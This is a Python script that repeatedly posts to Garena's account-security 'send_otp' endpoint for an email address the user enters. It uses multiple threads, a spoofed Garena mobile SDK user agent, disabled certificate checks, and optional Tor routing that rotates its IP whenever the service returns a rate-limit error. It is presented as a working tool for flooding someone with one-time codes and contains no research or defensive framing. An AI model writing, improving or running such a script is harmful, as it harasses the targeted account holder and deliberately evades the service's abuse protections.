import requests, sys, re, time, random, threading, json, os, subprocess
from concurrent.futures import ThreadPoolExecutor
import warnings
warnings.filterwarnings('ignore')

email = input("Email: ")
threads = int(input("Threads (1-10): ") or "5")
use_tor = input("Use Tor? (y/n): ").lower() == 'y'

checked = 0
found = False
lock = threading.Lock()
tor_started = False
last_request_time = 0
request_lock = threading.Lock()
tor_process = None
running = True
success_count = 0
fail_count = 0

def start_tor_termux():
    global tor_started, tor_process
    try:
        print("Starting Tor...")
        tor_process = subprocess.Popen(['tor'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(3)
        tor_started = True
        print("Tor started")
        return True
    except Exception as e:
        print(f"Tor start error: {e}")
        return False

def check_tor():
    try:
        test_session = requests.Session()
        test_session.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }
        test_session.verify = False
        test_session.timeout = 5
        r = test_session.get('https://check.torproject.org/', timeout=5)
        return r.status_code == 200
    except:
        return False

def rotate_tor_ip():
    try:
        import stem
        from stem import Signal
        from stem.control import Controller
        with Controller.from_port(port=9051) as controller:
            controller.authenticate()
            controller.signal(Signal.NEWNYM)
        print("IP rotated")
        time.sleep(1)
        return True
    except:
        try:
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect(('127.0.0.1', 9051))
            s.send(b'AUTHENTICATE ""\r\n')
            s.send(b'SIGNAL NEWNYM\r\n')
            s.send(b'QUIT\r\n')
            s.close()
            print("IP rotated")
            time.sleep(1)
            return True
        except:
            try:
                subprocess.run(['pkill', '-HUP', 'tor'], capture_output=True)
                time.sleep(1)
                print("IP rotated")
                return True
            except:
                return False

if use_tor:
    if start_tor_termux():
        time.sleep(2)
        if not check_tor():
            print("Tor not responding, but continuing...")
    else:
        print("Tor failed, continuing without Tor")
        use_tor = False

def get_session():
    session = requests.Session()
    if use_tor and tor_started:
        session.proxies = {
            'http': 'socks5h://127.0.0.1:9050',
            'https': 'socks5h://127.0.0.1:9050'
        }
    session.verify = False
    session.timeout = 10
    session.headers.update({
        'Connection': 'close'
    })
    return session

def send_otp(thread_id):
    global checked, found, running, success_count, fail_count, last_request_time
    if found:
        return True
    
    if use_tor and thread_id % 2 == 0:
        rotate_tor_ip()
    
    headers = {
        'User-Agent': 'GarenaMSDK/4.0.42(M2006C3LII ;Android 10;en;GB;app 1.130.1 2019121038;)',
        'Accept': 'application/json',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Connection': 'close'
    }
    
    session = get_session()
    
    try:
        with request_lock:
            current = time.time()
            elapsed = current - last_request_time
            if elapsed < 0.1:
                time.sleep(0.1 - elapsed)
            last_request_time = time.time()
        
        data = {
            'app_id': '100067',
            'email': email,
            'locale': 'en_HK'
        }
        
        r = session.post('https://100067.connect.garena.com/game/account_security/swap:send_otp', 
                         data=data, headers=headers, timeout=10)
        
        with lock:
            checked += 1
            print(f"[{checked}] Thread-{thread_id} | Status: {r.status_code}")
        
        if r.status_code == 200:
            try:
                data = r.json()
                if data.get('result') == 0:
                    print("OTP Sent")
                    with lock:
                        success_count += 1
                else:
                    with lock:
                        fail_count += 1
            except:
                with lock:
                    fail_count += 1
        elif r.status_code == 429:
            print("Rate limit, rotating IP...")
            if use_tor:
                rotate_tor_ip()
            with lock:
                fail_count += 1
        else:
            with lock:
                fail_count += 1
        session.close()
        return False
    except Exception as e:
        print(f"Error: {str(e)[:50]}")
        if use_tor:
            rotate_tor_ip()
        with lock:
            fail_count += 1
        return False

print(f"\nSending OTPs to {email}")
print(f"Tor: {'Enabled' if use_tor else 'Disabled'}")
print(f"Threads: {threads}")
print("Press Ctrl+C to stop")
print("="*60)

with ThreadPoolExecutor(max_workers=threads) as executor:
    futures = []
    while running and not found:
        for i in range(threads):
            if not running or found:
                break
            futures.append(executor.submit(send_otp, i))
            time.sleep(0.05)
        
        for future in futures:
            if not running or found:
                break
            try:
                future.result(timeout=30)
            except:
                pass
        
        if checked % 10 == 0:
            print(f"Sent: {checked} | Success: {success_count} | Failed: {fail_count}")

if tor_process:
    tor_process.terminate()